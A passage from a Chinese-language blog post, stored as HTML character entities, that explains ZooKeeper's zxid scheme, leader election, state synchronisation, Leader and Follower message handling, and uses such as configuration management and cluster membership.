x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x4E8B;&#x52A1;&#x7684;&#x987A;&#x5E8F;&#x4E00;&#x81F4;&#x6027;&#xFF0C;zookeeper&#x91C7;&#x7528;&#x4E86;&#x9012;&#x589E;&#x7684;&#x4E8B;&#x52A1;id&#x53F7;&#xFF08;zxid&#xFF09;&#x6765;&#x6807;&#x8BC6;&#x4E8B;&#x52A1;&#x3002;&#x6240;&#x6709;&#x7684;&#x63D0;&#x8BAE;&#xFF08;proposal&#xFF09;&#x90FD;&#x5728;&#x88AB;&#x63D0;&#x51FA;&#x7684;&#x65F6;&#x5019;&#x52A0;&#x4E0A;&#x4E86;zxid&#x3002;&#x5B9E;&#x73B0;&#x4E2D;zxid&#x662F;&#x4E00;&#x4E2A;64&#x4F4D;&#x7684;&#x6570;&#x5B57;&#xFF0C;&#x5B83;&#x9AD8;32&#x4F4D;&#x662F;epoch&#x7528;&#x6765;&#x6807;&#x8BC6;leader&#x5173;&#x7CFB;&#x662F;&#x5426;&#x6539;&#x53D8;&#xFF0C;&#x6BCF;&#x6B21;&#x4E00;&#x4E2A;leader&#x88AB;&#x9009;&#x51FA;&#x6765;&#xFF0C;&#x5B83;&#x90FD;&#x4F1A;&#x6709;&#x4E00;&#x4E2A;&#x65B0;&#x7684;epoch&#xFF0C;&#x6807;&#x8BC6;&#x5F53;&#x524D;&#x5C5E;&#x4E8E;&#x90A3;&#x4E2A;leader&#x7684;&#x7EDF;&#x6CBB;&#x65F6;&#x671F;&#x3002;&#x4F4E;32&#x4F4D;&#x7528;&#x4E8E;&#x9012;&#x589E;&#x8BA1;&#x6570;&#x3002;</p>\n<p>&#x6BCF;&#x4E2A;Server&#x5728;&#x5DE5;&#x4F5C;&#x8FC7;&#x7A0B;&#x4E2D;&#x6709;&#x4E09;&#x79CD;&#x72B6;&#x6001;&#xFF1A;</p>\n<ul>\n<li>LOOKING&#xFF1A;&#x5F53;&#x524D;Server&#x4E0D;&#x77E5;&#x9053;leader&#x662F;&#x8C01;&#xFF0C;&#x6B63;&#x5728;&#x641C;&#x5BFB;</li>\n<li>LEADING&#xFF1A;&#x5F53;&#x524D;Server&#x5373;&#x4E3A;&#x9009;&#x4E3E;&#x51FA;&#x6765;&#x7684;leader</li>\n<li>FOLLOWING&#xFF1A;leader&#x5DF2;&#x7ECF;&#x9009;&#x4E3E;&#x51FA;&#x6765;&#xFF0C;&#x5F53;&#x524D;Server&#x4E0E;&#x4E4B;&#x540C;&#x6B65;</li>\n</ul>\n<a id=\"more\"></a>\n<hr>\n<h3 id=\"&#x9009;&#x4E3B;&#x6D41;&#x7A0B;\"><a href=\"#&#x9009;&#x4E3B;&#x6D41;&#x7A0B;\" class=\"headerlink\" title=\"&#x9009;&#x4E3B;&#x6D41;&#x7A0B;\"></a>&#x9009;&#x4E3B;&#x6D41;&#x7A0B;</h3><p>&#x5F53;leader&#x5D29;&#x6E83;&#x6216;&#x8005;leader&#x5931;&#x53BB;&#x5927;&#x591A;&#x6570;&#x7684;follower&#xFF0C;&#x8FD9;&#x65F6;&#x5019;zk&#x8FDB;&#x5165;&#x6062;&#x590D;&#x6A21;&#x5F0F;&#xFF0C;&#x6062;&#x590D;&#x6A21;&#x5F0F;&#x9700;&#x8981;&#x91CD;&#x65B0;&#x9009;&#x4E3E;&#x51FA;&#x4E00;&#x4E2A;&#x65B0;&#x7684;leader&#xFF0C;&#x8BA9;&#x6240;&#x6709;&#x7684;Server&#x90FD;&#x6062;&#x590D;&#x5230;&#x4E00;&#x4E2A;&#x6B63;&#x786E;&#x7684;&#x72B6;&#x6001;&#x3002;Zk&#x7684;&#x9009;&#x4E3E;&#x7B97;&#x6CD5;&#x6709;&#x4E24;&#x79CD;&#xFF1A;&#x4E00;&#x79CD;&#x662F;&#x57FA;&#x4E8E;basic paxos&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x53E6;&#x5916;&#x4E00;&#x79CD;&#x662F;&#x57FA;&#x4E8E;fast paxos&#x7B97;&#x6CD5;&#x5B9E;&#x73B0;&#x7684;&#x3002;&#x7CFB;&#x7EDF;&#x9ED8;&#x8BA4;&#x7684;&#x9009;&#x4E3E;&#x7B97;&#x6CD5;&#x4E3A;fast paxos&#x3002;&#x5148;&#x4ECB;&#x7ECD;basic paxos&#x6D41;&#x7A0B;&#xFF1A;</p>\n<p>1&#x3001;&#x9009;&#x4E3E;&#x7EBF;&#x7A0B;&#x7531;&#x5F53;&#x524D;Server&#x53D1;&#x8D77;&#x9009;&#x4E3E;&#x7684;&#x7EBF;&#x7A0B;&#x62C5;&#x4EFB;&#xFF0C;&#x5176;&#x4E3B;&#x8981;&#x529F;&#x80FD;&#x662F;&#x5BF9;&#x6295;&#x7968;&#x7ED3;&#x679C;&#x8FDB;&#x884C;&#x7EDF;&#x8BA1;&#xFF0C;&#x5E76;&#x9009;&#x51FA;&#x63A8;&#x8350;&#x7684;Server&#xFF1B;<br>2&#x3001;&#x9009;&#x4E3E;&#x7EBF;&#x7A0B;&#x9996;&#x5148;&#x5411;&#x6240;&#x6709;Server&#x53D1;&#x8D77;&#x4E00;&#x6B21;&#x8BE2;&#x95EE;(&#x5305;&#x62EC;&#x81EA;&#x5DF1;)&#xFF1B;<br>3&#x3001;&#x9009;&#x4E3E;&#x7EBF;&#x7A0B;&#x6536;&#x5230;&#x56DE;&#x590D;&#x540E;&#xFF0C;&#x9A8C;&#x8BC1;&#x662F;&#x5426;&#x662F;&#x81EA;&#x5DF1;&#x53D1;&#x8D77;&#x7684;&#x8BE2;&#x95EE;(&#x9A8C;&#x8BC1;zxid&#x662F;&#x5426;&#x4E00;&#x81F4;)&#xFF0C;&#x7136;&#x540E;&#x83B7;&#x53D6;&#x5BF9;&#x65B9;&#x7684;id(myid)&#xFF0C;&#x5E76;&#x5B58;&#x50A8;&#x5230;&#x5F53;&#x524D;&#x8BE2;&#x95EE;&#x5BF9;&#x8C61;&#x5217;&#x8868;&#x4E2D;&#xFF0C;&#x6700;&#x540E;&#x83B7;&#x53D6;&#x5BF9;&#x65B9;&#x63D0;&#x8BAE;&#x7684;leader&#x76F8;&#x5173;&#x4FE1;&#x606F;(id,zxid)&#xFF0C;&#x5E76;&#x5C06;&#x8FD9;&#x4E9B;&#x4FE1;&#x606F;&#x5B58;&#x50A8;&#x5230;&#x5F53;&#x6B21;&#x9009;&#x4E3E;&#x7684;&#x6295;&#x7968;&#x8BB0;&#x5F55;&#x8868;&#x4E2D;&#xFF1B;<br>4&#x3001;&#x6536;&#x5230;&#x6240;&#x6709;Server&#x56DE;&#x590D;&#x4EE5;&#x540E;&#xFF0C;&#x5C31;&#x8BA1;&#x7B97;&#x51FA;zxid&#x6700;&#x5927;&#x7684;&#x90A3;&#x4E2A;Server&#xFF0C;&#x5E76;&#x5C06;&#x8FD9;&#x4E2A;Server&#x76F8;&#x5173;&#x4FE1;&#x606F;&#x8BBE;&#x7F6E;&#x6210;&#x4E0B;&#x4E00;&#x6B21;&#x8981;&#x6295;&#x7968;&#x7684;Server&#xFF1B;<br>5&#x3001;&#x7EBF;&#x7A0B;&#x5C06;&#x5F53;&#x524D;zxid&#x6700;&#x5927;&#x7684;Server&#x8BBE;&#x7F6E;&#x4E3A;&#x5F53;&#x524D;Server&#x8981;&#x63A8;&#x8350;&#x7684;Leader&#xFF0C;&#x5982;&#x679C;&#x6B64;&#x65F6;&#x83B7;&#x80DC;&#x7684;Server&#x83B7;&#x5F97;n/2 + 1&#x7684;Server&#x7968;&#x6570;&#xFF0C; &#x8BBE;&#x7F6E;&#x5F53;&#x524D;&#x63A8;&#x8350;&#x7684;leader&#x4E3A;&#x83B7;&#x80DC;&#x7684;Server&#xFF0C;&#x5C06;&#x6839;&#x636E;&#x83B7;&#x80DC;&#x7684;Server&#x76F8;&#x5173;&#x4FE1;&#x606F;&#x8BBE;&#x7F6E;&#x81EA;&#x5DF1;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x5426;&#x5219;&#xFF0C;&#x7EE7;&#x7EED;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#xFF0C;&#x76F4;&#x5230;leader&#x88AB;&#x9009;&#x4E3E;&#x51FA;&#x6765;&#x3002;</p>\n<p>&#x901A;&#x8FC7;&#x6D41;&#x7A0B;&#x5206;&#x6790;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x51FA;&#xFF1A;&#x8981;&#x4F7F;Leader&#x83B7;&#x5F97;&#x591A;&#x6570;Server&#x7684;&#x652F;&#x6301;&#xFF0C;&#x5219;Server&#x603B;&#x6570;&#x5FC5;&#x987B;&#x662F;&#x5947;&#x6570;2n+1&#xFF0C;&#x4E14;&#x5B58;&#x6D3B;&#x7684;Server&#x7684;&#x6570;&#x76EE;&#x4E0D;&#x5F97;&#x5C11;&#x4E8E;n+1.</p>\n<p>&#x6BCF;&#x4E2A;Server&#x542F;&#x52A8;&#x540E;&#x90FD;&#x4F1A;&#x91CD;&#x590D;&#x4EE5;&#x4E0A;&#x6D41;&#x7A0B;&#x3002;&#x5728;&#x6062;&#x590D;&#x6A21;&#x5F0F;&#x4E0B;&#xFF0C;&#x5982;&#x679C;&#x662F;&#x521A;&#x4ECE;&#x5D29;&#x6E83;&#x72B6;&#x6001;&#x6062;&#x590D;&#x7684;&#x6216;&#x8005;&#x521A;&#x542F;&#x52A8;&#x7684;server&#x8FD8;&#x4F1A;&#x4ECE;&#x78C1;&#x76D8;&#x5FEB;&#x7167;&#x4E2D;&#x6062;&#x590D;&#x6570;&#x636E;&#x548C;&#x4F1A;&#x8BDD;&#x4FE1;&#x606F;&#xFF0C;zk&#x4F1A;&#x8BB0;&#x5F55;&#x4E8B;&#x52A1;&#x65E5;&#x5FD7;&#x5E76;&#x5B9A;&#x671F;&#x8FDB;&#x884C;&#x5FEB;&#x7167;&#xFF0C;&#x65B9;&#x4FBF;&#x5728;&#x6062;&#x590D;&#x65F6;&#x8FDB;&#x884C;&#x72B6;&#x6001;&#x6062;&#x590D;&#x3002;&#x9009;&#x4E3B;&#x7684;&#x5177;&#x4F53;&#x6D41;&#x7A0B;&#x56FE;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E5%8E%9F%E7%90%86/1.png\" alt=\"\"></p>\n<p>fast paxos&#x6D41;&#x7A0B;&#x662F;&#x5728;&#x9009;&#x4E3E;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x67D0;Server&#x9996;&#x5148;&#x5411;&#x6240;&#x6709;Server&#x63D0;&#x8BAE;&#x81EA;&#x5DF1;&#x8981;&#x6210;&#x4E3A;leader&#xFF0C;&#x5F53;&#x5176;&#x5B83;Server&#x6536;&#x5230;&#x63D0;&#x8BAE;&#x4EE5;&#x540E;&#xFF0C;&#x89E3;&#x51B3;epoch&#x548C;zxid&#x7684;&#x51B2;&#x7A81;&#xFF0C;&#x5E76;&#x63A5;&#x53D7;&#x5BF9;&#x65B9;&#x7684;&#x63D0;&#x8BAE;&#xFF0C;&#x7136;&#x540E;&#x5411;&#x5BF9;&#x65B9;&#x53D1;&#x9001;&#x63A5;&#x53D7;&#x63D0;&#x8BAE;&#x5B8C;&#x6210;&#x7684;&#x6D88;&#x606F;&#xFF0C;&#x91CD;&#x590D;&#x8FD9;&#x4E2A;&#x6D41;&#x7A0B;&#xFF0C;&#x6700;&#x540E;&#x4E00;&#x5B9A;&#x80FD;&#x9009;&#x4E3E;&#x51FA;Leader&#x3002;&#x5176;&#x6D41;&#x7A0B;&#x56FE;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E5%8E%9F%E7%90%86/2.png\" alt=\"\"></p>\n<hr>\n<h3 id=\"&#x540C;&#x6B65;&#x6D41;&#x7A0B;\"><a href=\"#&#x540C;&#x6B65;&#x6D41;&#x7A0B;\" class=\"headerlink\" title=\"&#x540C;&#x6B65;&#x6D41;&#x7A0B;\"></a>&#x540C;&#x6B65;&#x6D41;&#x7A0B;</h3><p>&#x9009;&#x5B8C;leader&#x4EE5;&#x540E;&#xFF0C;zk&#x5C31;&#x8FDB;&#x5165;&#x72B6;&#x6001;&#x540C;&#x6B65;&#x8FC7;&#x7A0B;&#x3002;<br>1&#x3001;leader&#x7B49;&#x5F85;server&#x8FDE;&#x63A5;&#xFF1B;<br>2&#x3001;Follower&#x8FDE;&#x63A5;leader&#xFF0C;&#x5C06;&#x6700;&#x5927;&#x7684;zxid&#x53D1;&#x9001;&#x7ED9;leader&#xFF1B;<br>3&#x3001;Leader&#x6839;&#x636E;follower&#x7684;zxid&#x786E;&#x5B9A;&#x540C;&#x6B65;&#x70B9;&#xFF1B;<br>4&#x3001;&#x5B8C;&#x6210;&#x540C;&#x6B65;&#x540E;&#x901A;&#x77E5;follower &#x5DF2;&#x7ECF;&#x6210;&#x4E3A;uptodate&#x72B6;&#x6001;&#xFF1B;<br>5&#x3001;Follower&#x6536;&#x5230;uptodate&#x6D88;&#x606F;&#x540E;&#xFF0C;&#x53C8;&#x53EF;&#x4EE5;&#x91CD;&#x65B0;&#x63A5;&#x53D7;client&#x7684;&#x8BF7;&#x6C42;&#x8FDB;&#x884C;&#x670D;&#x52A1;&#x4E86;&#x3002;</p>\n<p>&#x6D41;&#x7A0B;&#x56FE;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E5%8E%9F%E7%90%86/3.png\" alt=\"\"></p>\n<hr>\n<h3 id=\"&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;\"><a href=\"#&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;\" class=\"headerlink\" title=\"&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;\"></a>&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;</h3><h4 id=\"Leader&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;\"><a href=\"#Leader&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;\" class=\"headerlink\" title=\"Leader&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;\"></a>Leader&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;</h4><p>Leader&#x4E3B;&#x8981;&#x6709;&#x4E09;&#x4E2A;&#x529F;&#x80FD;&#xFF1A;<br>1&#x3001;&#x6062;&#x590D;&#x6570;&#x636E;&#xFF1B;<br>2&#x3001;&#x7EF4;&#x6301;&#x4E0E;Learner&#x7684;&#x5FC3;&#x8DF3;&#xFF0C;&#x63A5;&#x6536;Learner&#x8BF7;&#x6C42;&#x5E76;&#x5224;&#x65AD;Learner&#x7684;&#x8BF7;&#x6C42;&#x6D88;&#x606F;&#x7C7B;&#x578B;&#xFF1B;<br>3&#x3001;Learner&#x7684;&#x6D88;&#x606F;&#x7C7B;&#x578B;&#x4E3B;&#x8981;&#x6709;PING&#x6D88;&#x606F;&#x3001;REQUEST&#x6D88;&#x606F;&#x3001;ACK&#x6D88;&#x606F;&#x3001;REVALIDATE&#x6D88;&#x606F;&#xFF0C;&#x6839;&#x636E;&#x4E0D;&#x540C;&#x7684;&#x6D88;&#x606F;&#x7C7B;&#x578B;&#xFF0C;&#x8FDB;&#x884C;&#x4E0D;&#x540C;&#x7684;&#x5904;&#x7406;&#x3002;</p>\n<p>PING&#x6D88;&#x606F;&#x662F;&#x6307;Learner&#x7684;&#x5FC3;&#x8DF3;&#x4FE1;&#x606F;&#xFF1B;REQUEST&#x6D88;&#x606F;&#x662F;Follower&#x53D1;&#x9001;&#x7684;&#x63D0;&#x8BAE;&#x4FE1;&#x606F;&#xFF0C;&#x5305;&#x62EC;&#x5199;&#x8BF7;&#x6C42;&#x53CA;&#x540C;&#x6B65;&#x8BF7;&#x6C42;&#xFF1B;ACK&#x6D88;&#x606F;&#x662F;Follower&#x7684;&#x5BF9;&#x63D0;&#x8BAE;&#x7684;&#x56DE;&#x590D;&#xFF0C;&#x8D85;&#x8FC7;&#x534A;&#x6570;&#x7684;Follower&#x901A;&#x8FC7;&#xFF0C;&#x5219;commit&#x8BE5;&#x63D0;&#x8BAE;&#xFF1B;REVALIDATE&#x6D88;&#x606F;&#x662F;&#x7528;&#x6765;&#x5EF6;&#x957F;SESSION&#x6709;&#x6548;&#x65F6;&#x95F4;&#x3002;</p>\n<p>Leader&#x7684;&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;&#x7B80;&#x56FE;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF0C;&#x5728;&#x5B9E;&#x9645;&#x5B9E;&#x73B0;&#x4E2D;&#xFF0C;&#x6D41;&#x7A0B;&#x8981;&#x6BD4;&#x4E0B;&#x56FE;&#x590D;&#x6742;&#x5F97;&#x591A;&#xFF0C;&#x542F;&#x52A8;&#x4E86;&#x4E09;&#x4E2A;&#x7EBF;&#x7A0B;&#x6765;&#x5B9E;&#x73B0;&#x529F;&#x80FD;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E5%8E%9F%E7%90%86/4.png\" alt=\"\"></p>\n<h4 id=\"Follower&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;\"><a href=\"#Follower&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;\" class=\"headerlink\" title=\"Follower&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;\"></a>Follower&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;</h4><p>Follower&#x4E3B;&#x8981;&#x6709;&#x56DB;&#x4E2A;&#x529F;&#x80FD;&#xFF1A;<br>1&#x3001;&#x5411;Leader&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#xFF08;PING&#x6D88;&#x606F;&#x3001;REQUEST&#x6D88;&#x606F;&#x3001;ACK&#x6D88;&#x606F;&#x3001;REVALIDATE&#x6D88;&#x606F;&#xFF09;&#xFF1B;<br>2&#x3001;&#x63A5;&#x6536;Leader&#x6D88;&#x606F;&#x5E76;&#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF1B;<br>3&#x3001;&#x63A5;&#x6536;Client&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x5982;&#x679C;&#x4E3A;&#x5199;&#x8BF7;&#x6C42;&#xFF0C;&#x53D1;&#x9001;&#x7ED9;Leader&#x8FDB;&#x884C;&#x6295;&#x7968;&#xFF1B;<br>4&#x3001;&#x8FD4;&#x56DE;Client&#x7ED3;&#x679C;&#x3002;</p>\n<p>Follower&#x7684;&#x6D88;&#x606F;&#x5FAA;&#x73AF;&#x5904;&#x7406;&#x5982;&#x4E0B;&#x51E0;&#x79CD;&#x6765;&#x81EA;Leader&#x7684;&#x6D88;&#x606F;&#xFF1A;</p>\n<p>1&#x3001;ING&#x6D88;&#x606F;&#xFF1A; &#x5FC3;&#x8DF3;&#x6D88;&#x606F;&#xFF1B;<br>2&#x3001;PROPOSAL&#x6D88;&#x606F;&#xFF1A;Leader&#x53D1;&#x8D77;&#x7684;&#x63D0;&#x6848;&#xFF0C;&#x8981;&#x6C42;Follower&#x6295;&#x7968;&#xFF1B;<br>3&#x3001;COMMIT&#x6D88;&#x606F;&#xFF1A;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x6700;&#x65B0;&#x4E00;&#x6B21;&#x63D0;&#x6848;&#x7684;&#x4FE1;&#x606F;&#xFF1B;<br>4&#x3001;UPTODATE&#x6D88;&#x606F;&#xFF1A;&#x8868;&#x660E;&#x540C;&#x6B65;&#x5B8C;&#x6210;&#xFF1B;<br>5&#x3001;REVALIDATE&#x6D88;&#x606F;&#xFF1A;&#x6839;&#x636E;Leader&#x7684;REVALIDATE&#x7ED3;&#x679C;&#xFF0C;&#x5173;&#x95ED;&#x5F85;revalidate&#x7684;session&#x8FD8;&#x662F;&#x5141;&#x8BB8;&#x5176;&#x63A5;&#x53D7;&#x6D88;&#x606F;&#xFF1B;<br>6&#x3001;SYNC&#x6D88;&#x606F;&#xFF1A;&#x8FD4;&#x56DE;SYNC&#x7ED3;&#x679C;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x8FD9;&#x4E2A;&#x6D88;&#x606F;&#x6700;&#x521D;&#x7531;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x8D77;&#xFF0C;&#x7528;&#x6765;&#x5F3A;&#x5236;&#x5F97;&#x5230;&#x6700;&#x65B0;&#x7684;&#x66F4;&#x65B0;&#x3002;</p>\n<p>Follower&#x7684;&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;&#x7B80;&#x56FE;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF0C;&#x5728;&#x5B9E;&#x9645;&#x5B9E;&#x73B0;&#x4E2D;&#xFF0C;Follower&#x662F;&#x901A;&#x8FC7;5&#x4E2A;&#x7EBF;&#x7A0B;&#x6765;&#x5B9E;&#x73B0;&#x529F;&#x80FD;&#x7684;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E5%8E%9F%E7%90%86/5.png\" alt=\"\"></p>\n<p>&#x5BF9;&#x4E8E;observer&#x7684;&#x6D41;&#x7A0B;&#x4E0D;&#x518D;&#x53D9;&#x8FF0;&#xFF0C;observer&#x6D41;&#x7A0B;&#x548C;Follower&#x7684;&#x552F;&#x4E00;&#x4E0D;&#x540C;&#x7684;&#x5730;&#x65B9;&#x5C31;&#x662F;observer&#x4E0D;&#x4F1A;&#x53C2;&#x52A0;leader&#x53D1;&#x8D77;&#x7684;&#x6295;&#x7968;&#x3002;</p>\n<hr>\n<h3 id=\"&#x4E3B;&#x6D41;&#x5E94;&#x7528;&#x573A;&#x666F;\"><a href=\"#&#x4E3B;&#x6D41;&#x5E94;&#x7528;&#x573A;&#x666F;\" class=\"headerlink\" title=\"&#x4E3B;&#x6D41;&#x5E94;&#x7528;&#x573A;&#x666F;\"></a>&#x4E3B;&#x6D41;&#x5E94;&#x7528;&#x573A;&#x666F;</h3><p>Zookeeper&#x7684;&#x4E3B;&#x6D41;&#x5E94;&#x7528;&#x573A;&#x666F;&#x5B9E;&#x73B0;&#x601D;&#x8DEF;&#xFF08;&#x9664;&#x53BB;&#x5B98;&#x65B9;&#x793A;&#x4F8B;&#xFF09; </p>\n<h4 id=\"&#x914D;&#x7F6E;&#x7BA1;&#x7406;\"><a href=\"#&#x914D;&#x7F6E;&#x7BA1;&#x7406;\" class=\"headerlink\" title=\"&#x914D;&#x7F6E;&#x7BA1;&#x7406;\"></a>&#x914D;&#x7F6E;&#x7BA1;&#x7406;</h4><p>&#x96C6;&#x4E2D;&#x5F0F;&#x7684;&#x914D;&#x7F6E;&#x7BA1;&#x7406;&#x5728;&#x5E94;&#x7528;&#x96C6;&#x7FA4;&#x4E2D;&#x662F;&#x975E;&#x5E38;&#x5E38;&#x89C1;&#x7684;&#xFF0C;&#x4E00;&#x822C;&#x5546;&#x4E1A;&#x516C;&#x53F8;&#x5185;&#x90E8;&#x90FD;&#x4F1A;&#x5B9E;&#x73B0;&#x4E00;&#x5957;&#x96C6;&#x4E2D;&#x7684;&#x914D;&#x7F6E;&#x7BA1;&#x7406;&#x4E2D;&#x5FC3;&#xFF0C;&#x5E94;&#x5BF9;&#x4E0D;&#x540C;&#x7684;&#x5E94;&#x7528;&#x96C6;&#x7FA4;&#x5BF9;&#x4E8E;&#x5171;&#x4EAB;&#x5404;&#x81EA;&#x914D;&#x7F6E;&#x7684;&#x9700;&#x6C42;&#xFF0C;&#x5E76;&#x4E14;&#x5728;&#x914D;&#x7F6E;&#x53D8;&#x66F4;&#x65F6;&#x80FD;&#x591F;&#x901A;&#x77E5;&#x5230;&#x96C6;&#x7FA4;&#x4E2D;&#x7684;&#x6BCF;&#x4E00;&#x4E2A;&#x673A;&#x5668;&#x3002;</p>\n<p>Zookeeper&#x5F88;&#x5BB9;&#x6613;&#x5B9E;&#x73B0;&#x8FD9;&#x79CD;&#x96C6;&#x4E2D;&#x5F0F;&#x7684;&#x914D;&#x7F6E;&#x7BA1;&#x7406;&#xFF0C;&#x6BD4;&#x5982;&#x5C06;APP1&#x7684;&#x6240;&#x6709;&#x914D;&#x7F6E;&#x914D;&#x7F6E;&#x5230;/APP1 znode&#x4E0B;&#xFF0C;APP1&#x6240;&#x6709;&#x673A;&#x5668;&#x4E00;&#x542F;&#x52A8;&#x5C31;&#x5BF9;/APP1&#x8FD9;&#x4E2A;&#x8282;&#x70B9;&#x8FDB;&#x884C;&#x76D1;&#x63A7;(zk.exist(&#x201C;/APP1&#x201D;,true)),&#x5E76;&#x4E14;&#x5B9E;&#x73B0;&#x56DE;&#x8C03;&#x65B9;&#x6CD5;Watcher&#xFF0C;&#x90A3;&#x4E48;&#x5728;zookeeper&#x4E0A;/APP1 znode&#x8282;&#x70B9;&#x4E0B;&#x6570;&#x636E;&#x53D1;&#x751F;&#x53D8;&#x5316;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6BCF;&#x4E2A;&#x673A;&#x5668;&#x90FD;&#x4F1A;&#x6536;&#x5230;&#x901A;&#x77E5;&#xFF0C;Watcher&#x65B9;&#x6CD5;&#x5C06;&#x4F1A;&#x88AB;&#x6267;&#x884C;&#xFF0C;&#x90A3;&#x4E48;&#x5E94;&#x7528;&#x518D;&#x53D6;&#x4E0B;&#x6570;&#x636E;&#x5373;&#x53EF;(zk.getData(&#x201C;/APP1&#x201D;,false,null));</p>\n<p>&#x4EE5;&#x4E0A;&#x8FD9;&#x4E2A;&#x4F8B;&#x5B50;&#x53EA;&#x662F;&#x7B80;&#x5355;&#x7684;&#x7C97;&#x9897;&#x7C92;&#x5EA6;&#x914D;&#x7F6E;&#x76D1;&#x63A7;&#xFF0C;&#x7EC6;&#x9897;&#x7C92;&#x5EA6;&#x7684;&#x6570;&#x636E;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x5206;&#x5C42;&#x7EA7;&#x76D1;&#x63A7;&#xFF0C;&#x8FD9;&#x4E00;&#x5207;&#x90FD;&#x662F;&#x53EF;&#x4EE5;&#x8BBE;&#x8BA1;&#x548C;&#x63A7;&#x5236;&#x7684;&#x3002;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E5%8E%9F%E7%90%86/6.png\" alt=\"\"></p>\n<h4 id=\"&#x96C6;&#x7FA4;&#x7BA1;&#x7406;\"><a href=\"#&#x96C6;&#x7FA4;&#x7BA1;&#x7406;\" class=\"headerlink\" title=\"&#x96C6;&#x7FA4;&#x7BA1;&#x7406;\"></a>&#x96C6;&#x7FA4;&#x7BA1;&#x7406;</h4><p>&#x5E94;&#x7528;&#x96C6;&#x7FA4;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x5E38;&#x5E38;&#x9700;&#x8981;&#x8BA9;&#x6BCF;&#x4E00;&#x4E2A;&#x673A;&#x5668;&#x77E5;&#x9053;&#x96C6;&#x7FA4;&#x4E2D;&#xFF08;&#x6216;&#x4F9D;&#x8D56;&#x7684;&#x5176;&#x4ED6;&#x67D0;&#x4E00;&#x4E2A;&#x96C6;&#x7FA4;&#xFF09;&#x54EA;&#x4E9B;&#x673A;&#x5668;&#x662F;&#x6D3B;&#x7740;&#x7684;&#xFF0C;&#x5E76;&#x4E14;&#x5728;&#x96C6;&#x7FA4;&#x673A;&#x5668;&#x56E0;&#x4E3A;&#x5B95;&#x673A;&#xFF0C;&#x7F51;&#x7EDC;&#x65AD;&#x94FE;&#x7B49;&#x539F;&#x56E0;&#x80FD;&#x591F;&#x4E0D;&#x5728;&#x4EBA;&#x5DE5;&#x4ECB;&#x5165;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x8FC5;&#x901F;&#x901A;&#x77E5;&#x5230;&#x6BCF;&#x4E00;&#x4E2A;&#x673A;&#x5668;&#x3002;</p>\n<p>Zookeeper&#x540C;&#x6837;&#x5F88;&#x5BB9;&#x6613;&#x5B9E;&#x73B0;&#x8FD9;&#x4E2A;&#x529F;&#x80FD;&#xFF0C;&#x6BD4;&#x5982;&#x6211;&#x5728;zookeeper&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x6709;&#x4E00;&#x4E2A;znode&#x53EB;/APP1SERVERS,&#x90A3;&#x4E48;&#x96C6;&#x7FA4;&#x4E2D;&#x6BCF;&#x4E00;&#x4E2A;&#x673A;&#x5668;&#x542F;&#x52A8;&#x7684;&#x65F6;&#x5019;&#x90FD;&#x53BB;&#x8FD9;&#x4E2A;&#x8282;&#x70B9;&#x4E0B;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;EPHEMERAL&#x7C7B;&#x578B;&#x7684;&#x8282;&#x70B9;&#xFF0C;&#x6BD4;&#x5982;server1&#x521B;&#x5EFA;/APP1SERVERS/SERVER1(&#x53EF;&#x4EE5;&#x4F7F;&#x7528;ip,&#x4FDD;&#x8BC1;&#x4E0D;&#x91CD;&#x590D;)&#xFF0C;server2&#x521B;&#x5EFA;/APP1SERVERS/SERVER2&#xFF0C;&#x7136;&#x540E;SERVER1&#x548C;SERVER2&#x90FD;watch 